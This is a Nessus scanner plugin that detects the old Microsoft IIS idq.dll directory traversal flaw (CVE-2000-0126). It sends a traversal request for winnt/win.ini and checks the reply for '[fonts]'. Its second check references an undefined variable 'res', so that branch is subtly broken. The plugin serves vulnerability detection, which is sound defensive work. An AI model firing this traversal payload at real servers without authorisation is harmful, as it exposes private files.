#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10115);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0126");
 script_bugtraq_id(968);
 script_xref(name:"OSVDB", value:"96");

 script_name(english:"Microsoft IIS idq.dll Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote Windows host is affected by an information disclosure 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"There is a vulnerability in idq.dll which allows any remote
user to read any file on the target system through the 'query.idq' 
parameter." );
 script_set_attribute(attribute:"see_also", value:"http://www.microsoft.com/technet/security/bulletin/MS00-006.mspx" );
 script_set_attribute(attribute:"solution", value:
"Microsoft's webhits.dll addresses some of this issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Attempts to read an arbitrary file");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");
port = get_http_port(default:80);


sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);

base = "/query.idq?CiTemplate=../../../../../winnt/win.ini";

res1 = http_send_recv3(method:"GET", item:base, port:port);

if (isnull(res1)) exit(1, "The remote web server did not respond.");
if("[fonts]" >< res1[2])
{
  security_warning(port);
  exit(0);
}

res2 = http_send_recv3(method:"GET", item:string(base, crap(data:"%20", length:300)), port:port);
if (isnull(res2)) exit(1, "The remote web server did not respond.");
if("[fonts]" >< res[2])
{
  security_warning(port);
  exit(0);
}
